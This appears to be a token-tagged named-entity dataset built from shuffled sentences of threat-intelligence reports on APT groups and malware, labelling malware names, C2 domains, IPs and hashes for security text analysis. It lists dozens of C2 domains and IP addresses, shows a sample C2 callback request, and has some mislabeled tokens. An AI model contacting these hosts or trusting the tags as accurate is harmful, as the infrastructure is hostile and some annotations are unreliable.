.	O

Based	O
on	O
the	O
document	O
metadata	O
,	O
the	O
language	O
in	O
which	O
the	O
list	O
is	O
written	O
is	O
Ukrainian	O
,	O
but	O
the	O
original	O
language	O
of	O
the	O
document	O
is	O
Russian	O
.	O

Unfortunately	O
,	O
the	O
attempt	O
failed	O
.	O

Attackers	O
used	O
the	O
DynamicDNS	O
to	O
host	O
the	O
C2	O
server	O
,	O
this	O
allows	O
the	O
attacker	O
to	O
quickly	O
change	O
the	O
IP	O
address	O
in	O
real	O
time	O
if	O
the	O
malware	O
C2	O
server	O
infrastructure	O
is	O
unavailable	O
.	O

The	O
payloads	O
served	O
by	O
the	O
C	O
&	O
C	O
servers	O
are	O
mostly	O
PowerShell	O
scripts	O
with	O
embedded	O
base64-encoded	O
payloads	O
(	O
Metasploit	O
and	O
Cobalt	O
Strike	O
payloads	O
)	O
:	O

The	O
code	O
inside	O
the	O
box	O
manipulates	O
the	O
images	O
shown	O
in	O
the	O
document	O
's	O
body	O
.	O

For	O
example	O
,	O
in	O
the	O
case	O
of	O
Attack	O
2	O
,	O
the	O
Windows	O
shortcut	O
files	O
were	O
not	O
conclusively	O
identified	O
as	O
malicious	O
by	O
even	O
savvy	O
opposition	O
members	O
for	O
an	O
extended	O
period	O
of	O
time	O
.	O

It	O
is	O
extracted	O
into	O
a	O
temporary	O
file	O
named	O
%	O
TEMP%\~D%random%.tmp	O
.	O

From	O
mid	O
July	O
to	O
early	O
September	O
,	O
dozens	O
of	O
visitors	O
were	O
redirected	O
from	O
tamindir[.]com	B-url.normal
to	O
true-crypt[.]com	B-url.normal
with	O
unsurprisingly	O
almost	O
all	O
of	O
the	O
focus	O
on	O
systems	O
in	O
Turkey	O
,	O
with	O
victims	O
in	O
the	O
Netherlands	O
as	O
well	O
.	O

The	O
malware	O
then	O
concatenates	O
all	O
the	O
data	O
to	O
be	O
sent	O
as	O
a	O
128-bytes	O
block	O
.	O

This	O
way	O
Babar	B-malware.drop
has	O
control	O
over	O
all	O
keyboard	O
and	O
message	O
events	O
received	O
by	O
any	O
application	O
on	O
the	O
same	O
Windows	O
desktop	O
.	O

These	O
malware	O
families	O
were	O
spread	O
using	O
Ukrainian	O
accounting	O
software	O
called	O
M.E.Doc	O
.	O

T	O
he	O
initial	O
infection	O
vector	O
used	O
in	O
the	O
attack	O
against	O
the	O
data	O
center	O
is	O
unclear	O
.	O

人工智能	O
(	O
2	O
)	O

The	O
three	O
drivers	O
in	O
question	O
could	O
easily	O
have	O
been	O
used	O
in	O
early	O
versions	O
of	O
Duqu	B-malware.infosteal
or	O
with	O
other	O
Trojans	O
based	O
on	O
the	O
Stuxnet/Duqu	B-malware.backdoor
platform	O
.	O

'	O
ComServer	O
'	O
:	O
These	O
keys	O
contain	O
the	O
command	O
and	O
control	O
(	O
C	O
&	O
C	O
)	O
servers	O
'	O
URLs	O
.	O

Further	O
inspection	O
of	O
the	O
malware	O
extracted	O
showed	O
it	O
was	O
n't	O
a	O
family	O
our	O
analysts	O
recognised	O
.	O

Using	O
the	O
setStartup	O
(	O
)	O
method	O
,	O
the	O
dropper	O
first	O
checks	O
if	O
it	O
is	O
running	O
as	O
a	O
root	O
or	O
not	O
.	O

If	O
the	O
process	O
is	O
running	O
,	O
the	O
driver	O
is	O
not	O
installed	O
but	O
the	O
continues	O
regardless	O
.	O

Cylance	O
found	O
that	O
at	O
least	O
half	O
of	O
the	O
infrastructure	O
associated	O
with	O
The	O
Deception	O
Project	O
appeared	O
to	O
be	O
dark	O
or	O
at	O
least	O
unused	O
.	O

In	O
a	O
report	O
released	O
on	O
January	O
7	O
2017	O
,	O
the	O
U.S.	O
Directorate	O
of	O
National	O
Intelligence	O
described	O
this	O
activity	O
as	O
an	O
'	O
influence	O
campaign	O
.	O
'	O

As	O
a	O
result	O
of	O
this	O
action	O
,	O
we	O
assess	O
that	O
Iran	O
will	O
likely	O
respond	O
quickly	O
by	O
launching	O
destructive	O
attacks	O
on	O
American	O
,	O
European	O
,	O
and	O
rival	O
nation	O
(	O
countries	O
such	O
as	O
Saudi	O
Arabia	O
and	O
Israel	O
)	O
businesses	O
.	O

Microsoft	O
confirmed	O
this	O
vulnerability	O
on	O
the	O
morning	O
of	O
April	O
20th	O
and	O
released	O
an	O
official	O
security	O
patch	O
on	O
May	O
8th	O
.	O

https://www.usenix.org/legacy/event/hotbots07/tech/full_papers/rajab/rajab.pdf	B-url.normal
This	O
entry	O
was	O
posted	O
in	O
Threat	O
Intelligence	O
,	O
Threat	O
Research	O
by	O
Nart	O
Villeneuve	O
and	O
James	O
T	O
.	O

Alternatively	O
,	O
it	O
can	O
query	O
for	O
a	O
message	O
for	O
a	O
specified	O
sender	O
with	O
a	O
specified	O
amount	O
of	O
Convertible	O
Currency	O
:	O

Overview	O
of	O
the	O
malware	O
delivery	O
infrastructure	O

Targeting	O
profiles	O
included	O
defense	O
related	O
commercial	O
and	O
military	O
organizations	O
,	O
and	O
telecommunications	O
.	O

JbossMiner	O
is	O
using	O
known	O
database	O
vulnerabilities	O
to	O
spread	O
.	O

Figure	O
2	O
.	O

Dino	B-malware.backdoor
's	O
binary	O
shows	O
an	O
intense	O
development	O
effort	O
,	O
from	O
custom	O
data	O
structures	O
to	O
a	O
homemade	O
file	O
system	O
.	O

We	O
will	O
take	O
a	O
look	O
at	O
the	O
keylogger	O
later	O
on	O
.	O

Below	O
are	O
the	O
indicators	O

Startup	O
Item/Shortcut	O
:	O
EaahLDRej.lnk	O

Secondly	O
,	O
there	O
has	O
n't	O
been	O
a	O
single	O
variant	O
of	O
Stuxnet	B-malware.backdoor
that	O
is	O
capable	O
of	O
interacting	O
with	O
these	O
drivers	O
.	O

The	O
URL	O
of	O
the	O
remote	O
file	O
is	O
built	O
out	O
of	O
two	O
constant	O
strings	O
which	O
again	O
might	O
suggest	O
some	O
kind	O
of	O
builder	O
to	O
this	O
platform	O
.	O

Win32/TrojanDropper	O
.	O

Below	O
is	O
a	O
table	O
demonstrating	O
the	O
artifacts	O
and	O
their	O
corresponding	O
value	O
:	O
sandbox	O
usernames	O
and	O
paths	O
Generic	O
sandbox	O
sleep	O
patch	O
DeleteFile	O
is	O
hooked	O
Sandboxie	O
sbiedll	O
is	O
injected	O
Wine	O
Linux	O
emulator	O
is	O
present	O
Running	O
in	O
Virtualbox	O
VM	O
Running	O
in	O
VMWARE	O
VM	O
Running	O
in	O
QEMU	O
VM	O
9-21	O
22-25	O
26,27	O

In	O
the	O
summer	O
of	O
2016	O
,	O
multiple	O
encryption-enabled	O
software	O
applications	O
were	O
targeted	O
with	O
watering	B-malware.backdoor
hole	I-malware.backdoor
,	O
social	O
engineering	O
tactics	O
,	O
and	O
spyware	O
by	O
the	O
StrongPity	O
APT	O
.	O

Figure	O
2	O
:	O
PEiD	O
reveals	O
that	O
the	O
binary	O
was	O
written	O
using	O
Visual	O
C++	O
6.0	O

This	O
malicious	O
DLL	O
records	O
five	O
seconds	O
of	O
'	O
normal	O
'	O
traffic	O
from	O
a	O
PLC	O
to	O
the	O
user	O
interface	O
and	O
replays	O
it	O
,	O
while	O
sending	O
different	O
data	O
back	O
to	O
the	O
PLC	O
.	O

Obtain	O
the	O
vbscript.dll	O
base	O
address	O
in	O
the	O
following	O
way	O
.	O

specifically	O
Interesting	O
samples	O
of	O
over	O
250	O
identified	O
malicious	O
domains*	O
:	O
b-of-americ.com	B-url.cncsvr
osce-military.org	B-url.cncsvr
bbcnewsweek.com	B-url.cncsvr
qov.hu.com	B-url.cncsvr
settings-yahoo.com	B-url.cncsvr
yovtube.co	B-url.cncsvr
googlesetting.com	B-url.cncsvr
cbiuaebn.com	B-url.cncsvr
cbiuaebank.com	B-url.cncsvr
techcruncln.com	B-url.cncsvr
un-unicef.org	B-url.cncsvr
royalbsuk.com	B-url.cncsvr
kwqx.us	B-url.cncsvr
middle-eastreview.org	B-url.cncsvr
unitednat.org	B-url.cncsvr
fbonlinelottery.com	B-url.cncsvr
fubnt.com	B-url.cncsvr
globeshippers.biz	B-url.cncsvr
globeshippers.net	B-url.cncsvr
gsandsc.com	B-url.cncsvr
gshippers.com	B-url.cncsvr
hesselawchambers.com	B-url.cncsvr
largefarm.net	B-url.cncsvr
regionsbnk.info	B-url.cncsvr
seatreasures.org	B-url.cncsvr
ssandsc.com	B-url.cncsvr
t-d-canadatrust.com	B-url.cncsvr
techielawfirms.com	B-url.cncsvr
togounoffice.com	B-url.cncsvr
ubagroupsgh.com	B-url.cncsvr
un-unicef.org	B-url.cncsvr
unicomba.com	B-url.cncsvr
universalcoba.com	B-url.cncsvr
*Some	O
domains	O
may	O
have	O
been	O
previously	O
reported	O
as	O
associated	O
with	O
the	O
Sofacy	O
Group	O
.	O

2.3.1	O
.	O

As	O
well	O
as	O
directly	O
examining	O
the	O
samples	O
through	O
static	O
and	O
dynamic	O
analysis	O
,	O
we	O
infected	O
a	O
virtual	O
machine	O
(	O
VM	O
)	O
with	O
the	O
malware	O
.	O

Conclusion	O

All	O
rights	O
reserved	O
.	O

The	O
shellcode	O
decrypts	O
and	O
loads	O
the	O
library	O
{	O
E1E4CBED-5690-4749-819D-24FB660DF55F	O
}	O
.dll	O
.	O

Over	O
the	O
last	O
year	O
,	O
HBGary	O
has	O
analyzed	O
thousands	O
of	O
distinct	O
malware	O
samples	O
that	O
communicate	O
with	O
3322.org	O
.	O

All	O
other	O
functions	O
are	O
either	O
empty	O
or	O
also	O
filled	O
with	O
calls	O
to	O
MessageBoxA	O
(	O
)	O
,	O
which	O
is	O
unusual	O
for	O
DLL	O
loading	O
implants	O
.	O

GetSIN192.10.8.64	B-ip.unknown
|	O
27038511	O

Win.Trojan.DustySky	B-malware.drop

Lateral	O
movement	O
tools	O
:	O

-	O
Sleeps	O
for	O
a	O
specified	O
number	O
of	O
minutes	O
#	O
delay	O
?	O

One	O
of	O
the	O
.DLL	B-malware.backdoor
files	O
serves	O
as	O
a	O
loader	O
for	O
the	O
other	O
.DLL	B-malware.backdoor
file	O
,	O
which	O
is	O
the	O
main	O
backdoor	O
component	B-malware.backdoor
.	O

Several	O
fake	O
installers	O
,	O
claiming	O
to	O
be	O
installers	O
or	O
updates	O
for	O
popular	O
software	O
were	O
seen	O
in	O
watering	O
hole	O
campaigns	O
.	O

'	O
Referer	O
:	O
'	O
;	O
http_header	O
;	O
content	O
:	O
!	O

The	O
backdoor	O
exploited	O
a	O
vulnerability	O
called	O
'	O
DLL	O
hijacking	O
'	O
in	O
order	O
to	O
'	O
hide	O
'	O
the	O
malware	O
inside	O
trusted	O
software	O
.	O

Further	O
,	O
our	O
research	O
indicates	O
that	O
because	O
of	O
the	O
need	O
for	O
a	O
quick	O
response	O
,	O
the	O
Islamic	O
Republic	O
may	O
utilize	O
contractors	O
that	O
are	O
less	O
politically	O
and	O
ideologically	O
reliable	O
(	O
and	O
trusted	O
)	O
and	O
as	O
a	O
result	O
,	O
could	O
be	O
more	O
difficult	O
to	O
control	O
.	O

Figure	O
2	O
:	O
Decoded	O
PowerShell	O
Snippet	O

155CAD31A61F	O

https://github.com/stephenfewer/ReflectiveDLLInjection	B-url.normal
http://www.harmonysecurity.com/files/HS-P005_ReflectiveDllInjection.pdf	B-url.normal

2017	O
.	O

Below	O
screen	O
shots	O
show	O
the	O
ping	O
to	O
the	O
C2	O
server	O
.	O

The	O
only	O
other	O
method	O
of	O
minimizing	O
the	O
0-day	O
threat	O
is	O
by	O
actively	O
designing	O
security	O
into	O
software	O
.	O

During	O
this	O
time	O
attackers	O
used	O
C	O
&	O
C	O
servers	O
to	O
monitor	O
the	O
activities	O
on	O
the	O
infected	O
machines	O
and	O
uploaded	O
tools	O
on	O
a	O
previously	O
compromised	O
legitimate	O
Taiwanese	O
website	O
.	O

Table	O
1	O
:	O
'	O
Showimg.asp	O
'	O
Metadata	O
Showimg.asp	O
is	O
an	O
example	O
of	O
an	O
early	O
stage	O
web	O
shell	O
used	O
to	O
build	O
an	O
initial	O
foothold	O
within	O
a	O
network	O
.	O

This	O
kind	O
of	O
flaw	O
in	O
tradecraft	O
allowed	O
for	O
further	O
detailed	O
network	O
analysis	O
.	O

We	O
collectively	O
refer	O
to	O
this	O
package	O
and	O
related	O
activity	O
as	O
'	O
Zebrocy	B-malware.backdoor
'	O
and	O
had	O
written	O
a	O
few	O
reports	O
on	O
its	O
usage	O
and	O
development	O
by	O
June	O
2017	O
–	O
Sofacy	O
developers	O
modified	O
and	O
redeployed	O
incremented	O
versions	O
of	O
the	O
malware	O
.	O

Here	O
is	O
a	O
short	O
list	O
of	O
the	O
types	O
of	O
tools	O
included	O
with	O
ZxShell	B-malware.backdoor
:	O
Keylogger	O
(	O
used	O
to	O
capture	O
passwords	O
and	O
other	O
interesting	O
data	O
)	O
Command	O
line	O
shell	O
for	O
remote	O
administration	O
Remote	O
desktop	O
Various	O
network	O
attack	O
tools	O
used	O
to	O
fingerprint	O
and	O
compromise	O
other	O
hosts	O
on	O
the	O
network	O
Local	O
user	O
account	O
creation	O
tools	O
For	O
a	O
complete	O
list	O
of	O
tools	O
please	O
see	O
the	O
MainConnectionIo	O
section	O
.	O

Then	O
executes	O
xp_cmdshell	O
(	O
which	O
executes	O
the	O
Bulk	O
Copy	O
Program	O
)	O
to	O
copy	O
the	O
data	O
from	O
that	O
table	O
to	O
a	O
file	O
whose	O
name	O
is	O
specified	O
in	O
unlabeled	O
textbox2	O
.	O

877­FIREEYE	O
(	O
877­347­3393	O
)	O
Glassdoor	O
Copyright	O
©	O
2016	O
FireEye	O
,	O
Inc	O
.	O

After	O
its	O
execution	O
,	O
the	O
fake	O
font	O
updater	O
drops	O
another	O
application	O
whose	O
sole	O
purpose	O
is	O
to	O
delete	O
the	O
dropper	O
.	O

InjectApp	O
:	O
Leverages	O
existing	O
higher-level	O
vel	O
interprocess	O
communication	O
mechanisms	O
by	O
sending	O
an	O
kASAppleScriptSuite/	O
kGetAEUTused	O
event	O
to	O
a	O
process	O
to	O
make	O
it	O
load	O
Apple	O
scripting	O
additions	O
.	O

Based	O
on	O
open	O
source	O
reporting	O
,	O
social	O
media	O
posts	O
,	O
and	O
video	O
evidence	O
,	O
CrowdStrike	O
assesses	O
that	O
30.apk	B-malware.backdoor
was	O
potentially	O
used	O
through	O
2016	O
by	O
at	O
least	O
one	O
artillery	O
unit	O
operating	O
in	O
eastern	O
Ukraine	O
.	O

Aside	O
from	O
security	O
programs	O
and	O
other	O
programs	O
used	O
daily	O
that	O
can	O
be	O
used	O
to	O
profile	O
its	O
targets	O
,	O
the	O
DUBNIUM	B-malware.drop
malware	O
also	O
checks	O
for	O
various	O
program	O
analysis	O
tools	O
including	O
Pin	O
and	O
DynamoRIO	O
.	O

Indicators	O
Of	O
Compromise	O

Based	O
on	O
this	O
timeline	O
of	O
leak	O
and	O
threatened	O
leak	O
activity	O
,	O
as	O
well	O
as	O
strikingly	O
similar	O
characteristics	O
and	O
distribution	O
methods	O
shared	O
between	O
@	O
anpoland	O
and	O
'	O
Fancy	O
Bears	O
'	O
Hack	O
Team	O
,	O
'	O
the	O
same	O
operators	O
are	O
highly	O
likely	O
behind	O
the	O
two	O
personas	O
.	O

?	O
?	O

This	O
backdoor	O
sent	O
the	O
following	O
callback	O
traffic	O
to	O
video[.]csmcpr[.]com	B-url.unknown
:	O

GET	O
/123.functions	O
HTTP/1.1	O
Accept	O
:	O
*/*	O
Accept-Encoding	O
:	O
gzip	O
,	O
deflate	O
User-Agent	O
:	O
Mozilla/4.0	O
(	O
compatible	O
;	O
MSIE	O
7.0	O
;	O
Windows	O
NT	O
5.1	O
;	O
(	O
R1	O
1.5	O
)	O
;	O
.NET4.0C	O
;	O
.NET4.0E	O
;	O
.NET	O
CLR	O
1.1.4322	O
;	O
.NET	O
CLR	O
2.0.50727	O
;	O
.NET	O
CLR	O
3.0.04506.30	O
)	O
Host	O
:	O
tn5.linkpc.net:81	O

Searching	O
the	O
internet	O
for	O
the	O
author	O
and	O
document	O
names	O
yields	O
information	O
regarding	O
South	O
Asia	O
politics	O
.	O

Looking	O
at	O
the	O
original	O
file	O
's	O
(	O
)	O
imported	O
functions	O
,	O
it	O
's	O
clear	O
the	O
DLL	O
is	O
responsible	O
for	O
some	O
type	O
of	O
audio	O
processing	O
and/or	O
playback	O
.	O

To	O
increase	O
the	O
probability	O
of	O
successfully	O
infecting	O
the	O
target	O
systems	O
,	O
various	O
propagation	O
vectors	O
should	O
be	O
embedded	O
into	O
the	O
malware	O
.	O

The	O
main	O
code	O
aims	O
to	O
load	O
and	O
execute	O
two	O
additional	O
.NET	O
binaries	O
stored	O
in	O
the	O
resources	O
of	O
the	O
file	O
:	O
The	O
first	O
resource	O
is	O
a	O
legitimate	O
open-source	O
library	O
available	O
on	O
GitHub	O
.	O

안랩	O
시큐리티대응센터	O
(	O
ASEC	O
)	O
분석연구팀	O

He	O
claimed	O
that	O
he	O
was	O
n't	O
able	O
to	O
install	O
the	O
app	O
.	O

악성코드	O
–	O
백도어	O
(	O
Backdoor	O
)	O
...........................................................................................................................	O
13	O
1.1	O
)	O
Aryan	O
.....................................................................................................................................................................	O
13	O
1.2	O
)	O
Ghostrat	B-malware.backdoor
...............................................................................................................................................................	O
13	O
1.3	O
)	O
Rifdoor	B-malware.backdoor
.................................................................................................................................................................	O
14	O
1.4	O
)	O
Phandoor	B-malware.backdoor
.............................................................................................................................................................	O
16	O
1.5	O
)	O
Andaratm	B-malware.backdoor
............................................................................................................................................................	O
17	O
2	O
.	O

However	O
,	O
despite	O
some	O
similarities	O
in	O
the	O
Tactics	O
,	O
Techniques	O
,	O
and	O
Procedures	O
(	O
TTPs	O
)	O
used	O
by	O
the	O
hackers	O
in	O
both	O
operations	O
,	O
Operation	O
BugDrop	O
's	O
TTPs	O
are	O
significantly	O
more	O
sophisticated	O
than	O
those	O
used	O
in	O
the	O
earlier	O
operation	O
.	O

Sending	O
WM_DDE_EXECUTE	O
message	O
to	O
window	O

Decoy	O
Document	O
Title	O
:	O
Decoy	O
Document	O
Author	O
:	O

The	O
shell	O
will	O
simply	O
display	O
the	O
text	O
â	O
€	O
œPassword	O
:	O
â	O
€	O
,	O
a	O
text	O
input	O
box	O
,	O
and	O
a	O
Login	O
button	O
.	O

Hundreds	O
of	O
leaked	O
emails	O
published	O
on	O
the	O
Kazaword	O
website	O
also	O
suggest	O
possible	O
links	O
between	O
this	O
campaign	O
and	O
Arcanum	O
Global	O
Intelligence	O
,	O
a	O
private	O
intelligence	O
company	O
with	O
headquarters	O
in	O
Zurich	O
,	O
which	O
was	O
allegedly	O
hired	O
by	O
the	O
government	O
of	O
Kazakhstan	O
to	O
perform	O
a	O
surveillance	O
and	O
data	O
extraction	O
operation	B-malware.ransom
against	O
a	O
high-profile	O
dissident	O
.	O

However	O
,	O
the	O
report	O
does	O
not	O
present	O
strong	O
evidence	O
to	O
support	O
this	O
conclusion	O
.	O

For	O
instance	O
,	O
if	O
the	O
computer	O
name	O
is	O
random-pc	O
and	O
the	O
version	O
ID	O
is	O
0x0a841523	O
then	O
the	O
following	O
domain	O
could	O
be	O
created	O
:	O

remove_pw_Reschedule	O
of	O
CISD	O
Regular	O
Meeting.ex_	O

Here	O
you	O
can	O
see	O
the	O
bot	O
beaconing	O
in	O
and	O
requiring	O
for	O
authentication	O
(	O
funny	O
enough	O
the	O
password	O
is	O

Stuxnet	B-malware.backdoor
was	O
discovered	O
in	O
July	O
2010	O
,	O
but	O
the	O
earliest	O
known	O
variant	O
is	O
confirmed	O
to	O
have	O
existed	O
since	O
2007.Stuxnet	B-malware.backdoor
caught	O
many	O
security	O
researchers	O
and	O
professionals	O
by	O
surprise	O
,	O
being	O
the	O
first	O
advanced	O
malware	O
of	O
its	O
kind	O
.	O

Through	O
its	O
modular	O
plugin	O
framework	O
,	O
this	O
particular	O
tool	O
lets	O
the	O
attacker	O
obtain	O
System	O
Information	O
(	O
e.g.	O
IP	O
,	O
OS	O
version	O
,	O
memory	O
RAM	O
information	O
,	O
Java	O
version	O
,	O
Computer	O
Name	O
,	O
User	O
account	O
compromised	O
,	O
etc	O
.	O
)	O

A	O
new	O
version	O
of	O
Stuxnet	B-malware.backdoor
capable	O
of	O
installing	O
the	O
file	O
has	O
also	O
not	O
been	O
found	O
.	O

Poseidon	B-malware.infosteal
utilizes	O
a	O
variety	O
of	O
tools	O
.	O

Once	O
written	O
to	O
disk	O
,	O
this	O
process	O
is	O
created	O
through	O
the	O
CreateProcess	O
function	O
.	O

관리자	O
계정의	O
보안	O
관리가	O
강조되는	O
이유는	O
바로	O
이	O
때문이다	O
.	O

Please	O
note	O
that	O
this	O
is	O
not	O
a	O
vulnerability	O
or	O
exploit	O
within	O
the	O
Cisco	O
product	O
,	O
but	O
a	O
decision	O
by	O
the	O
attacker	O
to	O
use	O
a	O
Cisco	O
application	O
as	O
a	O
decoy	O
.	O

The	O
impact	O
of	O
this	O
malware	O
can	O
be	O
mitigated	O
with	O
proven	O
mitigation	O
techniques	O
such	O
as	O
routinely	O
scanning	O
the	O
network	O
for	O
any	O
malicious	O
activity	O
to	O
help	O
prevent	O
the	O
malware	O
from	O
entering	O
and	O
spreading	O
through	O
an	O
organization	O
.	O

case	O
'	O
g	O
'	O
:	O

Figure	O
5	O
.	O

Figure	O
2	O
-	O
Four-byte	O
XOR	O
Routine	O
(	O
Decoy	O
Decode	O
)	O
Figure	O
1	O
-	O
Six-byte	O
XOR	O
Routine	O
(	O
Malware	O
Decode	O
)	O
Figure	O
3	O
-	O
Cisco	O
Installation	O
Prompt	O
Presented	O
to	O
the	O
Victim	O
After	O
being	O
initiated	O
by	O
the	O
initial	O
launcher	O
the	O
legitimate	O
looking	O
decoy	O
Cisco	O
Installer	O
process	O
executes	O
and	O
becomes	O
visible	O
to	O
the	O
victim	O
.	O

These	O
are	O
DDoS	B-malware.unknown
bots	O
,	O
used	O
to	O
build	O
a	O
botnet	O
which	O
can	O
be	O
utilized	O
to	O
attack	O
adversaries	O
on	O
the	O
internet	O
.	O

As	O
part	O
of	O
the	O
investigation	O
,	O
we	O
also	O
tried	O
to	O
figure	O
out	O
what	O
additional	O
information	O
we	O
may	O
learn	O
from	O
the	O
attacker	O
's	O
Pastebin	O
account	O
:	O
The	O
account	O
was	O
probably	O
created	O
using	O
the	O
mail	O
fineisgood123@gmail[.]com	O
–	O
the	O
same	O
email	O
address	O
used	O
to	O
register	O
blockbitcoin[.]com	O
(	O
the	O
attacker	O
's	O
crypto-mining	O
pool	O
&	O
malware	O
host	O
)	O
and	O
swb[.]one	O
(	O
Old	O
server	O
used	O
to	O
host	O
malware	O
&	O
leaked	O
files	O
.	O

The	O
increase	O
in	O
cyber-exploits	O
is	O
also	O
accompanied	O
by	O
a	O
much	O
more	O
aggressive	O
Russian	O
foreign	O
policy	O
,	O
which	O
has	O
seen	O
them	O
invade	O
Ukraine	O
and	O
literally	O
seize	O
control	O
of	O
sovereign	O
territory	O
in	O
Crimea	O
.	O

Figure	O
1	O
:	O
Tweety	B-malware.backdoor
Chat	O
's	O
interface	O
(	O
top	O
)	O
,	O
and	O
code	O
snippets	O
showing	O
the	O
file	O
types	O
it	O
steals	O
(	O
bottom	O
)	O

107.181.160.109	B-ip.unknown
109.237.108.202	B-ip.unknown
151.101.100.73	B-ip.unknown
151.236.20.16	B-ip.unknown
158.255.208.170	B-ip.unknown
158.255.208.189	B-ip.unknown
158.255.208.61	B-ip.unknown
160.202.163.79	B-ip.unknown
160.202.163.82	B-ip.unknown
160.202.163.90	B-ip.unknown
160.202.163.91	B-ip.unknown
169.239.128.143	B-ip.unknown
185.117.88.81	B-ip.unknown
185.133.40.63	B-ip.unknown
185.141.25.33	B-ip.unknown
211.110.17.209	B-ip.unknown
31.184.198.23	B-ip.unknown
31.184.198.38	B-ip.unknown
92.242.144.2	B-ip.unknown
One	O
of	O
the	O
most	O
perplexing	O
aspects	O
of	O
tracing	O
the	O
infrastructure	O
associated	O
with	O
this	O
particular	O
campaign	O
is	O
that	O
it	O
appeared	O
to	O
lead	O
to	O
a	O
significant	O
number	O
of	O
well-known	O
'	O
MenuPass'/	O
'	O
Stone	O
Panda	O
'	O
domains	O
.	O

Affected	O
Regions	O

Shortly	O
after	O
that	O
time	O
frame	O
,	O
on	O
28	O
April	O
2013	O
,	O
an	O
individual	O
bearing	O
the	O
same	O
name	O
as	O
the	O
application	O
's	O
developer	O
promoted	O
the	O
application	O
on	O
Russian	O
vKontakte	B-url.normal
pages	O
associated	O
with	O
the	O
artillery	O
forces	O
.	O

Undertaking	O
the	O
needed	O
remediation	O
strategies	O
to	O
prevent	O
similar	O
attacks	O
as	O
well	O
as	O
understanding	O
the	O
anatomy	O
of	O
more	O
advanced	O
malware	O
is	O
vital	O
for	O
mounting	O
an	O
adequate	O
defense	O
against	O
the	O
advanced	O
cyber	O
threats	O
.	O

22.02.2015	O
:	O
The	O
power	O
of	O
trust	O
:	O
'	O
Superfish	O
'	O
case	O
turns	O
into	O
a	O
worst	O
case	O
scenario	O

This	O
character	O
officially	O
described	O
as	O
'	O
Right-To-Left	O
Override	O
'	O
flips	O
the	O
directionality	O
of	O
the	O
string	O
from	O
its	O
position	O
and	O
onward	O
.	O

It	O
can	O
be	O
used	O
to	O
scan	O
remote	O
WordPress	O
sites	O
in	O
search	O
of	O
security	O
issues	O
.	O

Here	O
's	O
an	O
example	O
of	O
a	O
fingerprint	O
of	O
a	O
system	O
:	O

This	O
may	O
not	O
be	O
technically	O
difficult	O
,	O
but	O
it	O
does	O
require	O
a	O
lot	O
of	O
time	O
and	O
effort	O
.	O

25	O
.	O

Most	O
interestingly	O
the	O
command	O
Shell	O
spawns	O
a	O
Windows	O
command	O
shell	O
that	O
we	O
can	O
control	O
remotely	O
:	O
shell	O
>	O
Shell	O
$	O
shell	O
$	O
Microsoft	O
Windows	O
XP	O
[	O
Version	O
5.1.2600	O
]	O
(	O
C	O
)	O
Copyright	O
1985-2001	O
Microsoft	O
Corp	O
.	O

Later	O
in	O
the	O
execution	O
,	O
a	O
more	O
complex	O
rc4	O
loop	O
decrypts	O
the	O
download	O
url	O
and	O
other	O
strings	O
and	O
imports	O
.	O

Below	O
screen	O
shots	O
show	O
the	O
code	O
that	O
downloads	O
the	O
text	O
file	O
and	O
text	O
file	O
(	O
info.txt	O
)	O
saved	O
on	O
the	O
disk	O
.	O

The	O
compilation	O
path	O
string	O
contained	O
Korean	O
hieroglyphs	O
.	O

As	O
more	O
countries	O
utilize	O
inexpensive	O
and	O
efficient	O
cyber	O
operations	O
,	O
there	O
is	O
a	O
need	O
for	O
public	O
awareness	O
of	O
these	O
threats	O
and	O
renewed	O
dialogue	O
around	O
emerging	O
nationstate	O
intrusions	O
that	O
go	O
beyond	O
public	O
sector	O
and	O
intelligence	O
targets	O
.	O

Individual	O
returns	O
to	O
collect	O
more	O
cash	O
from	O
account	O
,	O
arrested	O
whilst	O
doing	O
so	O
.	O

element	O
of	O
stable_var_41C	O
and	O
the	O
value	O
iteration	O
.	O

If	O
it	O
receives	O
a	O
reply	O
of	O
status	O
code	O
that	O
is	O
100	O
or	O
greater	O
,	O
it	O
connects	O
to	O
an	O
actual	O
C	O
&	O
C	O
server	O
as	O
follows	O
:	O

[	O
그림	O
3	O
]	O
2017년	O
공격에	O
사용된	O
문서	O

However	O
,	O
the	O
specific	O
targeting	O
of	O
this	O
malware	O
is	O
not	O
clear	O
at	O
this	O
time	O
.	O

'	O
Fancy	O
Bears	O
'	O
Hack	O
Team	O
'	O
releases	O
five	O
additional	O
batches	O
of	O
medical	O
files	O
for	O
high-profile	O
athletes	O
from	O
multiple	O
nations	O
,	O
including	O
the	O
U.S.	O
,	O
which	O
had	O
applied	O
for	O
and	O
received	O
Therapeutic	O
Use	O
Exemptions	O
(	O
TUEs	O
)	O
for	O
medications	O
otherwise	O
banned	O
from	O
competition	O
.	O

We	O
have	O
observed	O
CozyDuke	B-malware.drop
being	O
spread	O
via	O
email	O
,	O
which	O
usually	O
contain	O
a	O
link	O
to	O
a	O
compromised	O
website	O
hosting	O
a	O
ZIP	O
file	O
(	O
although	O
in	O
at	O
least	O
one	O
case	O
,	O
the	O
file	O
was	O
hosted	O
on	O
Dropbox	O
)	O
.	O

2/10	O

For	O
example	O
,	O
submodule	O
Y	O
==	O
5	O
of	O
the	O
Skype	O
exfiltration	O
module	O
(	O
XX	O
==	O
14	O
)	O
,	O
contains	O
a	O
csv	O
representation	O
of	O
the	O
user	O
's	O
contact	O
list	O
:	O

3gp	O
video	O
,	O
contained	O
in	O
SFX	O
RAR	O
file	O
9C39D6F52E1E1BE5AE61BAB90971D054	B-hash

Online	O
video	O
clip	O
.	O

However	O
,	O
only	O
some	O
of	O
these	O
capabilities	O
were	O
leveraged	O
in	O
the	O
trilog.exe	O
sample	O
(	O
e.g.	O
the	O
attacker	O
did	O
not	O
leverage	O
all	O
of	O
TRITON	B-malware.unknown
's	O
extensive	O
reconnaissance	O
capabilities	O
)	O
.	O

The	O
size	O
will	O
be	O
512	O
bytes	O
from	O
header	O
to	O
footer	O
.	O

new.bat	O

This	O
is	O
interesting	O
because	O
this	O
is	O
the	O
name	O
of	O
the	O
folder	O
created	O
by	O
Mutter	B-malware.backdoor
on	O
victims	O
'	O
systems	O
.	O

The	O
OceanLotus	O
group	O
uses	O
an	O
old	O
and	O
publicly	O
known	O
technique	O
on	O
one	O
of	O
the	O
Symantec	O
product	O
's	O
executable	O
files	O
.	O

This	O
tool	O
contains	O
several	O
other	O
executable	O
files	O
made	O
in	O
different	O
programming	O
languages	O
ranging	O
from	O
Visual	O
Basic	O
6	O
to	O
C	O
#	O
,	O
each	O
one	O
performing	O
a	O
very	O
clear	O
task	O
devised	O
by	O
the	O
group	O
when	O
trying	O
to	O
obtain	O
more	O
information	O
from	O
